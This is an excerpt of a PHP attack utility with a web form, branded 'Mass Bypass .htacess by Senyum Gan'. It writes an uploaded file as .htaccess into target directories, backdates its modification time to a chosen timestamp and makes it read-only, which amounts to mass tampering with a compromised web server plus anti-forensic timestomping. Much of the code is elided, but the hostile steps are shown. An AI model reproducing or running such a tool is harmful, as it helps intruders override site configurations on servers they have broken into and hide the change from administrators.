...
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file']) && isset($_POST['target_path'])) {
    ...
    $touchTimestamp = date('YmdHi.s', $timestampUnix); // format untuk logging / touch -t
                ...
                if (is_dir($path)) {
                    ...
                    if (@file_put_contents($uploadFile, $fileContent) === false) {
                        ...
                        if (@rename($uploadFile, $htaccess)) {
                            ...
                            // Set waktu modifikasi sebelum chmod
                            if (@touch($htaccess, $timestampUnix)) {
                                $successLog[] = "⏰ Time set to $rawTimestamp for <code>$htaccess</code>";
                            } else {
                                $errorLog[] = "⚠️ Failed to set time for <code>$htaccess</code>";
                            }

                            // Set permission ke 0444
...
<body>
    <div class="container">
        <div class="header">
            ...
            <p>Mass Bypass .htacess by Senyum Gan</p>
        </div>
            ...
            <form id="uploadForm" method="POST" enctype="multipart/form-data">
                ...
                <div class="form-group">
                    ...
                    <input type="text" id="timestamp" name="timestamp" placeholder="2024-06-18 07:26:38" 
                        value="<?php echo isset($_POST['timestamp']) ? htmlspecialchars($_POST['timestamp']) : ''; ?>" 
                        required>
                </div>
